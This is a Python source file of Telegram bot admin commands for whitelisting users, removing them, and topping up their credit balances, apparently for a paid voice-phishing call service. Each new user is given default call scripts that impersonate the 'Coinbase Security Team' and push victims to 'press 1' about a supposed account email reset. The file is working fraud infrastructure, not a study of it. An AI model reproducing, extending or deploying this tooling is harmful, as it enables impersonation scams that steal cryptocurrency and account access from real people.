import json
import os
from telegram import Update
from telegram.ext import CallbackContext

DBPATH = 'database/user_settings.json'
BASE = 'database/config.json'

def is_whitelisted(
     user_id: str
):
     try:
          with open(
               DBPATH,
               "r"
          ) as file:
               user_settings = json.load(
                    file
               )
          return user_id in user_settings
     except Exception as e:
          print(
               f"ERROR in is_whitelisted: {e}"
          )
          return False


def manage_file(
     operation,
     path,
     data=None
):
     if operation == 'load':
          if os.path.exists(
               path
          ):
               with open(
                    path,
                    'r'
               ) as file:
                    return json.load(
                         file
                    )
          return {}
     elif operation == 'save' and data is not None:
          with open(
               path,
               'w'
          ) as file:
               json.dump(
                    data,
                    file,
                    indent=4
               )
     elif operation == 'load_config':
          if os.path.exists(
               path
          ):
               with open(
                    path,
                    'r'
               ) as file:
                    return json.load(
                         file
                    )
          else:
               raise FileNotFoundError(
                    f"incorrect -> {path}"
               )
     else:
          raise ValueError(
               "all ops are as they follow ->: 'load', 'save', or 'load_config'"
          )


def is_admin(
     user_id
):
     config = manage_file(
          'load_config',
          BASE
     )
     return user_id in config["admins"]

async def whitelist(
     update: Update,
     context: CallbackContext
):
     _ = context  
     user_id = update.message.from_user.id
     if not is_admin(
          user_id
     ):
          return  # ignore user [...]

     users = manage_file(
          'load',
          DBPATH
     )
     if len(
          context.args
     ) == 1:
          try:
               target_user_id = str(
                    context.args[0]
               )  
               
               if target_user_id not in users:
                    users[target_user_id] = {
                         "first_script": (
                              "Hello, this is an automated call from the Coinbase Security Team. "
                              "We are reaching out regarding a recent email reset request for your Coinbase account "
                              "if you did not initiate this request and need to secure your account, "
                              "please press 1 to take immediate action."
                         ),
                         "second_script": (
                              "Thank you for pressing 1. A representative will contact you shortly. "
                              "We appreciate you using Coinbase."
                         ),
                         "line_bot": True,
                         "balance": 0.0
                    }
                    manage_file(
                         'save',
                         DBPATH,
                         users
                    )
                    await update.message.reply_text(
                         f"✅ | user {target_user_id} has been whitelisted with default settings."
                    )
               else:
                    await update.message.reply_text(
                         f"✅ | {target_user_id} is already whitelisted"
                    )
          except ValueError:
               await update.message.reply_text(
                    "Incorrect user ID format. Please provide a numeric user ID."
               )
     else:
          await update.message.reply_text(
               "Correct format ->: /whitelist [user_id]"
          )


async def unwhitelist(
     update: Update,
     context: CallbackContext
):
     _ = context 
     user_id = update.message.from_user.id
     if not is_admin(
          user_id
     ):
          return  # ignore

     users = manage_file(
          'load',
          DBPATH
     )
     if len(
          context.args
     ) == 1:
          try:
               target_user_id = str(
                    context.args[0]
               ) 

               if target_user_id in users:
                    del users[target_user_id]  
                    manage_file(
                         'save',
                         DBPATH,
                         users
                    )
                    await update.message.reply_text(
                         f"✅ | user {target_user_id} has been unwhitelisted."
                    )
               else:
                    await update.message.reply_text(
                         f"❌ | user {target_user_id} not found in the system."
                    )
          except ValueError:
               await update.message.reply_text(
                    "Incorrect user ID format. Please provide a numeric user ID."
               )
     else:
          await update.message.reply_text(
               "Correct format ->: /unwhitelist [user_id]"
          )

async def topup(
     update: Update,
     context: CallbackContext
):
     _ = context 
     user_id = update.message.from_user.id
     if not is_admin(
          user_id
     ):
          return  # ignore 

     users = manage_file(
          'load',
          DBPATH
     )
     if len(
          context.args
     ) == 2:
          try:
               credits = float(
                    context.args[0]
               ) 
               target_user_id = str(
                    context.args[1]
               )  

               if target_user_id not in users:
                    await update.message.reply_text(
                         f"❌ | User {target_user_id} is not in the system."
                    )
                    return

               users[target_user_id]["balance"] += credits

               manage_file(
                    'save',
                    DBPATH,
                    users
               )

               await update.message.reply_text(
                    f"✅ | User {target_user_id}'s balance has been topped up by {credits}. "
                    f"They now have {users[target_user_id]['balance']} credits."
               )
          except ValueError:
               await update.message.reply_text(
                    "❌ | Credits & user ID should be numeric values."
               )
     else:
          await update.message.reply_text(
               "❌ | Correct format ->:: /topup [credits amount] [user_id]"
          )



async def get_user_info(
     update: Update,
     context: CallbackContext
):
     user_id = update.message.from_user.id
     users = manage_file(
          'load',
          DBPATH
     )
     if user_id in users:
          credits = users[user_id].get(
               'credits', 0
          )
          whitelisted = "yes" if users[user_id].get(
               'whitelisted', False
          ) else "no"
          await update.message.reply_text(
               f"your user info:\ncredits: {credits}\nwhitelisted: {whitelisted}"
          )
     else:
          await update.message.reply_text(
               "you are not in the system."
          )
